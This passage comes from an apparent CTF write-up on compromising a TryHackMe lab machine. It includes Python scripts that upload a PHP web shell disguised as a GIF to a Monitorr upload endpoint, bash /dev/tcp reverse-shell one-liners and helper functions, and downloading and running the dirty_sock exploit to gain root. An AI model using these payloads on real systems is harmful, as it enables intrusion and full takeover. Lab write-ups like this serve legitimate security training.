+    <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0'</span><span class="p">,</span>
+    <span class="s">'Accept'</span><span class="p">:</span> <span class="s">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="p">,</span>
+    <span class="s">'Accept-Language'</span><span class="p">:</span> <span class="s">'en-GB,en;q=0.5'</span><span class="p">,</span>
+    <span class="s">'Connection'</span><span class="p">:</span> <span class="s">'keep-alive'</span><span class="p">,</span>
+    <span class="s">'Upgrade-Insecure-Requests'</span><span class="p">:</span> <span class="s">'1'</span><span class="p">,</span>
+    <span class="s">'Cache-Control'</span><span class="p">:</span> <span class="s">'max-age=0'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://monitorr.robyns-petshop.thm/assets/php/upload.php'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Not only does this format the request nicely, but it makes it easy for us to use this in our script. As we can see, when our browser sent a request, it sent it along with the cookie <code class="highlighter-rouge">isHuman:1</code></p>
+
+<p>Of course it isn’t <em>super</em> helpful here, because the request payload is small and all we need to add is a cookie. But I find that it’s good to know for when you need longer curl requests formatted.</p>
+
+<p>Here is the modified script so far:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"specify params in format: python "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" target_url lhost lport"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"/assets/php/upload.php"</span>
+
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"isHuman"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span>
+        <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/plain, */*; q=0.01"</span><span class="p">,</span>
+        <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span>
+        <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+        <span class="s">"X-Requested-With"</span><span class="p">:</span> <span class="s">"XMLHttpRequest"</span><span class="p">,</span>
+        <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"multipart/form-data; boundary=---------------------------31046105003900160576454225745"</span><span class="p">,</span>
+        <span class="s">"Origin"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+        <span class="s">"Referer"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+    <span class="p">}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s">'-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name="fileToUpload"; filename="she_ll.php"</span><span class="se">\r\n</span><span class="s">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s">GIF89a213213123&lt;?php shell_exec("/bin/bash -c </span><span class="se">\'</span><span class="s">bash -i &gt;&amp; /dev/tcp/'</span>
+        <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="o">+</span> <span class="s">"/"</span>
+        <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+        <span class="o">+</span> <span class="s">" 0&gt;&amp;1'</span><span class="se">\"</span><span class="s">);</span><span class="se">\r\n\r\n</span><span class="s">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s">"</span>
+    <span class="p">)</span>
+
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+
+    <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"A shell script should be uploaded. Now we try to execute it"</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">"/assets/data/usrimg/she_ll.php"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span>
+        <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="p">,</span>
+        <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span>
+        <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+        <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I use the <a href="https://pypi.org/project/black/">Black</a> formatter to neaten up my python code. There are easy to install extensions/plugins for it for all the popular text editors. I like using vim for small things, so it’s handy to bind black to a shortcut that lets you quickly make your code nicer to read :)</p>
+
+<p>Anyway, here’s what happens when you run this code:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  python3 code.py https://monitorr.robyns-petshop.thm/ lhost lport
+&lt;div id='uploadreturn'&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php is not an image or exceeds the webserver’s upload size limit.&lt;/div&gt;&lt;div id='uploaderror'&gt;ERROR: she_ll.php was not uploaded.&lt;/div&gt;&lt;/div&gt;
+</code></pre></div></div>
+
+<p>Okay so now we have a different error. We are able to make requests, but it appears to be detecting the filetype somehow.</p>
+
+<p>I tried a few things, I tried uploading with the header of a jpg instead of a gif, changing the filesize (there is by default an image of size 5.3kb so this shoud not have been a problem), the file extension (I tried .php3, .php4, .php5, .phtml, .inc,  and .gif.{extension} for all of the extensions listed). None of these seemed to work, so I just looked at some php file upload cheat sheets, and tried everything I could find.</p>
+
+<p>After some research, I found that I could upload any file extension. This was possible by uploading a file in the format <code class="highlighter-rouge">filename.gif.pht</code> for example. For some reason, common filetypes that would normally work such as .pht did not in this case.</p>
+
+<p>I found that I could upload specifically php files by altering the case, as on upload, the filename would become all lower case.</p>
+
+<p><a href="https://book.hacktricks.xyz/pentesting-web/file-upload">this cheatsheet</a> was particularly helpful</p>
+
+<h1 id="getting-code-execution-as-user">Getting code execution as user</h1>
+
+<p>Adding this to the code should allow us to get code execution. Let’s try it:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  python3 script.py "ls -lah; whoami"
+total 16K
+drwxr-xr-x 2 www-data www-data 4.0K May  9 01:48 .
+drwxr-xr-x 5 www-data www-data 4.0K Apr 11 00:11 ..
+-rw-r--r-- 1 www-data www-data   73 May  9 01:48 46glaw.gif.php
+-rw-r--r-- 1 www-data www-data   78 May  9 01:48 qnugua.gif.php
+www-data
+</code></pre></div></div>
+
+<p>Nice! So if we want the first flag, we simply look in <code class="highlighter-rouge">/var/www</code> like so:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  python3 script.py "ls -a /var/www"
+.
+..
+dev
+flag1.txt
+html
+monitorr
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">/var/www</code> is the home directory of the www-data user. However if you aren’t sure of where a user’s home directory is then you can simply look in the /etc/passwd file :)</p>
+
+<p>Epic, one flag down!</p>
+
+<p>Also, here is the code for the script used above:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="nn">urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
+
+<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="n">b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">4</span><span class="p">)).</span><span class="n">decode</span><span class="p">().</span><span class="n">strip</span><span class="p">(</span><span class="s">"=="</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="s">""</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+    <span class="o">+</span> <span class="s">".gif.Php"</span>  <span class="c1"># just gets a random filename so we don't have to worry abt repeats
+</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"specify params in format: python "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" command"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="s">"https://monitorr.robyns-petshop.thm//assets/php/upload.php"</span>
+
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"isHuman"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+    <span class="p">}</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span>
+        <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/plain, */*; q=0.01"</span><span class="p">,</span>
+        <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span>
+        <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+        <span class="s">"X-Requested-With"</span><span class="p">:</span> <span class="s">"XMLHttpRequest"</span><span class="p">,</span>
+        <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"multipart/form-data; boundary=---------------------------31046105003900160576454225745"</span><span class="p">,</span>
+        <span class="s">"Origin"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+        <span class="s">"Referer"</span><span class="p">:</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
+    <span class="p">}</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="sa">f</span><span class="s">"""-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name="fileToUpload"; filename="</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s">"</span><span class="se">\r\n</span><span class="s">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s">GIF89a213213123"""</span>
+        <span class="o">+</span> <span class="sa">f</span><span class="s">"""&lt;?php $output = shell_exec("</span><span class="si">{</span><span class="n">command</span><span class="si">}</span><span class="s">"); echo($output);"""</span>
+        <span class="o">+</span> <span class="s">"""</span><span class="se">\r\n\r\n</span><span class="s">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s">"""</span>
+    <span class="p">)</span>
+
+    <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"https://monitorr.robyns-petshop.thm/assets/data/usrimg/</span><span class="si">{</span><span class="n">filename</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span><span class="si">}</span><span class="s">"</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"</span><span class="p">,</span>
+        <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="p">,</span>
+        <span class="s">"Accept-Language"</span><span class="p">:</span> <span class="s">"en-US,en;q=0.5"</span><span class="p">,</span>
+        <span class="s">"Accept-Encoding"</span><span class="p">:</span> <span class="s">"gzip, deflate"</span><span class="p">,</span>
+        <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">,</span>
+        <span class="s">"Upgrade-Insecure-Requests"</span><span class="p">:</span> <span class="s">"1"</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"GIF89a213213123"</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>Before we try to enumerate, it would probably be best to try get a shell instead of having our script run individual commands.</p>
+
+<p>I actually ran into some issues doing this, I couldn’t use just any port. It was only when testing to see if I could make it fetch a file from a http server that I realised only certain ports were allowed.</p>
+
+<p>This included commonly used low ports such as port 80 and port 443.</p>
+
+<p>Originally, I tried doing this with ngrok, instead of properly port forwarding.</p>
+
+<p>The free tier of ngrok doesn’t allow you to control the port that it opens, so this is why I had to use my friend’s DO droplet.</p>
+
+<p>When going back to the machine for the purposes of making this writeup, I thought I’d make things easier for myself and just port forward via my router instead of creating a new droplet to recreate the original method</p>
+
+<p>Anyway here is how that went:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:/tmp/thm]
+└─╼ &gt;  python3 script.py "$(bashrevshell $(myip public) 443)"
+</code></pre></div></div>
+
+<p>The above command may look weird. What this is actually running is <code class="highlighter-rouge">python3 script.py "bash -c 'bash -i &gt;&amp; /dev/tcp/public_ip/port 0&gt;&amp;1'"</code></p>
+
+<p>I just have some useful bodge-y things in my <code class="highlighter-rouge">~/.bashrc</code> file that make CTFs a little easier. The ones used here are:</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>myip <span class="o">()</span> <span class="o">{</span>
+  <span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+      </span><span class="nb">echo</span> <span class="s2">"No arguments supplied, use 'myip tun0' or 'myip public'"</span>
+  <span class="k">fi
+
+  if</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s2">"wlo1"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s2">"tun0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>ifconfig <span class="nv">$1</span> | python3 <span class="nt">-c</span> <span class="s1">'input();print(input().split()[1])'</span>
+    <span class="c"># would include more interfaces but i only ever need these ones really</span>
+  <span class="k">fi
+
+  if</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s2">"external"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">=</span> <span class="s2">"public"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | python3 <span class="nt">-c</span> <span class="s2">"print(input()[1:-1])"</span>
+    <span class="c"># cursed</span>
+  <span class="k">fi</span>
+<span class="o">}</span>
+
+bashrevshell <span class="o">()</span> <span class="o">{</span>
+  <span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 0 <span class="o">]</span>
+    <span class="k">then
+      </span><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1'"</span>
+      <span class="k">return </span>0
+  <span class="k">fi
+
+  </span><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2"> 0&gt;&amp;1'"</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Feel free to append/modify them to your own bashrc file.</p>
+
+<p>So, if done properly, this should get us a shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[jambot3000@pop-os:~]
+└─╼ &gt;  sudo nc -nlvp 443
+Listening on 0.0.0.0 443
+Connection received on 54.154.26.58 48630
+bash: cannot set terminal process group (929): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$
+</code></pre></div></div>
+
+<h1 id="elevating-privileges">Elevating privileges</h1>
+
+<p>So, once I had access as www-data. The first thing I checked out was the <code class="highlighter-rouge">/var/www/monitorr/datausers.db</code> file. This file was mentioned in small text in the monitorr settings page</p>
+
+<p>the file read:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE TABLE `users` (
+                        `user_id` INTEGER PRIMARY KEY,
+                        `user_name` varchar(64),
+                        `user_password_hash` varchar(255),
+admin$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa
+</code></pre></div></div>
+
+<p>I thought for sure the way to elevate privileges here was to crack this hash and then use that as the password for the robyn user account. I went back to linus in order to steal his GPU power to do this. No dice however. I even considered generating passwords based on a ruleset, using the names of the animals in the pictures on the original websites.</p>
+
+<p>After some basic testing, I looked at the kernel version in use:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@petshop:/var/www/monitorr/assets/data/usrimg$ uname -a
+Linux petshop 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div></div>
+
+<p>I realised this was an old kernel version, in fact, it even seemed to have privilege escalation exploits on exploitdb. Sadly however, none of them worked</p>
+
+<p>After trying a few enumeration scripts such as linpeas, I tried out <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux petshop 4.15.0-140-generic #144-Ubuntu SMP Fri Mar 19 14:12:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O lol.sh &amp;&amp; chmod +x lol.sh; ./lol.sh
+
+&lt;suggester.sh -O lol.sh &amp;&amp; chmod +x lol.sh; ./lol.sh
+
+--2021-05-10 20:06:19--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 87559 (86K) [text/plain]
+Saving to: 'lol.sh'
+
+     0K .......... .......... .......... .......... .......... 58% 4.09M 0s
+    50K .......... .......... .......... .....                100% 9.62M=0.02s
+
+2021-05-10 20:06:19 (5.37 MB/s) - 'lol.sh' saved [87559/87559]
+
+
+Available information:
+
+Kernel version: 4.15.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+76 kernel space exploits
+48 user space exploits
+
+Possible Exploits:
+
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+cat: write error: Broken pipe
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2018-18955] subuid_shell
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
+   Exposure: probable
+   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip
+   Comments: CONFIG_USER_NS needs to be enabled
+
+[+] [CVE-2019-7304] dirty_sock
+
+   Details: https://initblog.com/2019/dirty-sock/
+   Exposure: less probable
+   Tags: ubuntu=18.10,mint=19
+   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip
+   Comments: Distros use own versioning scheme. Manual verification needed.
+
+[+] [CVE-2019-18634] sudo pwfeedback
+
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+   Exposure: less probable
+   Tags: mint=19
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+   Comments: sudo configuration requires pwfeedback to be enabled.
+
+[+] [CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL:
+   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
+
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+[+] [CVE-2017-0358] ntfs-3g-modprobe
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+   Exposure: less probable
+   Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
+   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+</code></pre></div></div>
+
+<p>Then I went through each one, until I got to dirty sock. This was the one that ended up working. “dirty sock” is an exploit that affects an out of date, vulnerable version of the snapd daemon</p>
+
+<p>It allowed us to create a “dirty sock” user with root privileges</p>
+
+<p>Here’s how that went:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@petshop:/var/www/monitorr/assets/data/usrimg$ wget https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py -O sock.py &amp;&amp; python3 sock.py
+
+&lt;aster/dirty_sockv2.py -O sock.py &amp;&amp; python3 sock.py
+--2021-05-10 20:08:15--  https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8696 (8.5K) [text/plain]
+Saving to: 'sock.py'
+
+     0K ........                                              100% 57.3M=0s
+
+2021-05-10 20:08:16 (57.3 MB/s) - 'sock.py' saved [8696/8696]
+
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _
+      |  \ | |__/  |   \_/      [__  |  | |    |_/
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&amp;D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/wgpdfjhybs;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[+] Installing the trojan snap (and sleeping 8 seconds)...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+
+
+
+********************
+Success! You can now `su` to the following account and use sudo:
+   username: dirty_sock
+   password: dirty_sock
+********************
+</code></pre></div></div>
+
+<p>Now it’s as simple as switching to the “dirty_sock” user. First to get a proper tty shell so we can switch user, we can run <code class="highlighter-rouge">python3 -c "import pty;pty.spawn('/bin/bash')"</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@petshop:/var/www/monitorr/assets/data/usrimg$ su dirty_sock
+Password: dirty_sock
+
+dirty_sock@petshop:/var/www/monitorr/assets/data/usrimg$ sudo su
+[sudo] password for dirty_sock: dirty_sock
+
+root@petshop:/var/www/monitorr/assets/data/usrimg# cat /root/*
+THM{this is a fake flag}
+cat: /root/snap: Is a directory
+root@petshop:/var/www/monitorr/assets/data/usrimg#
+</code></pre></div></div>
+
